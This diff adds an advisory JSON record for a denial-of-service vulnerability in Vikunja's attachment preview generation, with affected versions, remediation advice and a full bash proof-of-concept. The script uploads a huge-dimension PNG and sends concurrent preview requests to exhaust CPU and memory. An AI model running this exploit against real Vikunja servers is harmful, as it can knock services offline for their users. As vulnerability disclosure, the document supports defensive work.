@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-wc83-79hj-hpmq",
+  "modified": "2026-03-25T21:19:09.198754Z",
+  "published": "2026-03-20T20:43:11Z",
+  "aliases": [
+    "CVE-2026-33474",
+    "GO-2026-4811"
+  ],
+  "summary": "Vikunja Affected by DoS via Image Preview Generation",
+  "details": "## Summary\n- Vulnerability: Unbounded image decoding and resizing during preview generation lets an attacker exhaust CPU and memory with highly compressed but extremely large-dimension images.\n- Affected code:\n  - Decoding without bounds: [task_attachment.go:GetPreview](../../tree/main/pkg/models/task_attachment.go#L219-L229)\n  - Resizing path: [resizeImage](../../tree/main/pkg/models/task_attachment.go#L293-L304)\n  - Endpoint invoking preview: [GetTaskAttachment](../../tree/main/pkg/routes/api/v1/task_attachment.go#L195-L203)\n- Impact: First preview generation per attachment can allocate large memory and spend significant CPU; multiple attachments or concurrent requests can degrade or crash the service.\n- CVSS v3.1: 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)\n\n## Preconditions\n- API running locally (`http://localhost:8080`).\n- Task attachments enabled: `task_attachments_enabled=true` in [Info](../../tree/main/pkg/routes/api/v1/info.go#L82-L160).\n- Any authenticated user with write access to a task.\n\n## How It Works\n- Preview generation decodes the full image via `image.Decode` and resizes to a target width. There are no guards on width/height or total pixels. A 10,000×10,000 PNG (~284 KB on disk) expands to ~100M pixels in memory during decode and triggers heavy CPU work in resize.\n- The first preview per attachment and size performs the heavy work; later requests are served from cache [keyvalue.Remember](../../tree/main/pkg/models/task_attachment.go#L220-L244).\n\n## Run The POC\n- Script: \n```sh\n#!/usr/bin/env bash\nset -euo pipefail\n\nBASE_URL=\"${BASE_URL:-http://localhost:8080}\"\nUSERNAME=\"${USERNAME:-dosuser}\"\nEMAIL=\"${EMAIL:-dosuser@example.com}\"\nPASSWORD=\"${PASSWORD:-StrongPass123!}\"\nPROJECT_TITLE=\"${PROJECT_TITLE:-poc-dos-preview}\"\nTASK_TITLE=\"${TASK_TITLE:-DoS preview test}\"\nOUT_DIR=\"${OUT_DIR:-/tmp/vikunja-poc-dos}\"\n\nmkdir -p \"$OUT_DIR\"\n\necho \"[+] Checking instance info\"\ncurl -sS \"$BASE_URL/api/v1/info\" | tee \"$OUT_DIR/info.json\" \u003e/dev/null\nif ! grep -q '\"task_attachments_enabled\":true' \"$OUT_DIR/info.json\"; then\n  echo \"[!] Task attachments disabled\"\n  exit 1\nfi\n\necho \"[+] Registering user (may already exist)\"\ncurl -sS -X POST \"$BASE_URL/api/v1/register\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"'\"$USERNAME\"'\",\"email\":\"'\"$EMAIL\"'\",\"password\":\"'\"$PASSWORD\"'\",\"language\":\"en\"}' \\\n  | tee \"$OUT_DIR/register.json\" \u003e/dev/null || true\n\necho \"[+] Logging in\"\ncurl -sS -X POST \"$BASE_URL/api/v1/login\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"'\"$USERNAME\"'\",\"password\":\"'\"$PASSWORD\"'\"}' \\\n  | tee \"$OUT_DIR/login.json\" \u003e/dev/null\nTOKEN=\"$(sed -n 's/.*\"token\"[[:space:]]*:[[:space:]]*\"\\([^\"]*\\)\".*/\\1/p' \"$OUT_DIR/login.json\")\"\nif [ -z \"$TOKEN\" ]; then\n  echo \"[!] Failed to get token\"\n  exit 1\nfi\n\necho \"[+] Creating project\"\ncurl -sS -X PUT \"$BASE_URL/api/v1/projects\" \\\n  -H 'Content-Type: application/json' \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"title\":\"'\"$PROJECT_TITLE\"'\"}' \\\n  | tee \"$OUT_DIR/project.json\" \u003e/dev/null\nPROJECT_ID=\"$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))[\"id\"])' \"$OUT_DIR/project.json\")\"\nif [ -z \"$PROJECT_ID\" ]; then\n  echo \"[!] Failed to get project id\"\n  exit 1\nfi\n\necho \"[+] Creating task\"\ncurl -sS -X PUT \"$BASE_URL/api/v1/projects/$PROJECT_ID/tasks\" \\\n  -H 'Content-Type: application/json' \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"title\":\"'\"$TASK_TITLE\"'\"}' \\\n  | tee \"$OUT_DIR/task.json\" \u003e/dev/null\nTASK_ID=\"$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))[\"id\"])' \"$OUT_DIR/task.json\")\"\nif [ -z \"$TASK_ID\" ]; then\n  echo \"[!] Failed to get task id\"\n  exit 1\nfi\n\necho \"[+] Generating 10000x10000 PNG payload\"\npython3 - \u003c\u003c'PY'\nfrom PIL import Image\nimg = Image.new('RGB', (10000,10000), color=(0,0,0))\nimg.save('/tmp/vikunja-poc-dos/huge.png', optimize=True)\nPY\nfile \"$OUT_DIR/huge.png\" || true\nls -lh \"$OUT_DIR/huge.png\" || true\n\necho \"[+] Uploading attachment\"\ncurl -sS -X PUT \"$BASE_URL/api/v1/tasks/$TASK_ID/attachments\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -F \"files=@$OUT_DIR/huge.png\" \\\n  | tee \"$OUT_DIR/attach.json\" \u003e/dev/null\nATTACHMENT_ID=\"$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d[\"success\"][0][\"id\"])' \"$OUT_DIR/attach.json\")\"\nif [ -z \"$ATTACHMENT_ID\" ]; then\n  echo \"[!] Failed to get attachment id\"\n  exit 1\nfi\n\necho \"[+] Requesting preview (xl)\"\n/usr/bin/time -l curl -sS -o \"$OUT_DIR/preview_xl.png\" \\\n  \"$BASE_URL/api/v1/tasks/$TASK_ID/attachments/$ATTACHMENT_ID?preview_size=xl\" \\\n  -H \"Authorization: Bearer $TOKEN\" 2\u003e \"$OUT_DIR/time_xl.txt\"\ndu -h \"$OUT_DIR/preview_xl.png\" || true\nfile \"$OUT_DIR/preview_xl.png\" || true\necho \"[+] Timing and memory (from /usr/bin/time):\"\ncat \"$OUT_DIR/time_xl.txt\" || true\n\necho \"[+] Parallel preview requests (cache warm) x10\"\nseq 1 10 | xargs -P 5 -I{} sh -c \"curl -s -w '%{time_total}\\n' -o /dev/null \\\n  '$BASE_URL/api/v1/tasks/$TASK_ID/attachments/$ATTACHMENT_ID?preview_size=xl' \\\n  -H 'Authorization: Bearer $TOKEN'\" | tee \"$OUT_DIR/parallel_times.txt\" \u003e/dev/null\necho \"[+] Done. Outputs in $OUT_DIR\"\n\n```\n- Uses `curl` and `python3` (Pillow) to generate a 10k×10k PNG, upload it, and request an xl preview while recording timing and memory metrics.\n\n### Steps\n1. Ensure the API is running on `http://localhost:8080`.\n2. Execute:\n   ```\n   bash pocs/image-preview-dos/poc.sh\n   ```\n3. Outputs of interest:\n   - `/tmp/vikunja-poc-dos/time_xl.txt`: `/usr/bin/time -l` timing and memory for the preview request.\n   - `/tmp/vikunja-poc-dos/parallel_times.txt`: 10 parallel preview times with cache warmed.\n   - `/tmp/vikunja-poc-dos/preview_xl.png`: Generated 800×800 preview.\n\n### Environment Overrides\n- BASE_URL: API base (default `http://localhost:8080`)\n- USERNAME, EMAIL, PASSWORD: credentials for the test user\n- PROJECT_TITLE, TASK_TITLE: names for test artifacts\n- OUT_DIR: output directory (default `/tmp/vikunja-poc-dos`)\n\n## Expected Results\n- First preview request shows higher latency and memory footprint, demonstrating server-side decode and resize of a 10k×10k image.\n- Subsequent requests are faster due to caching.\n- Parallel requests across multiple unique attachments reproduce the heavy work and can degrade the API.\n\n## Remediation\n- Enforce bounds prior to decode:\n  - Reject images exceeding max width/height (e.g., 8000×8000) or max total pixels (e.g., 20M).\n  - Fail early by reading headers to extract dimensions before full decode.\n- Add per-user and per-attachment rate limiting for preview generation.\n- Pre-generate previews asynchronously with throttling and backpressure.\n- Keep caching, but consider configurable cache eviction strategy to avoid repeated heavy work.\n\n## Notes\n- This POC uses a solid-color PNG to produce large dimensions with small file size. Other formats and images with extreme dimensions can be substituted.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.0.0-rc0"
+            },
+            {
+              "fixed": "2.2.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wc83-79hj-hpmq/GHSA-wc83-79hj-hpmq.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-wc83-79hj-hpmq"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33474"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://vikunja.io/changelog/vikunja-v2.2.0-was-released"
+    }
+  ]
+}
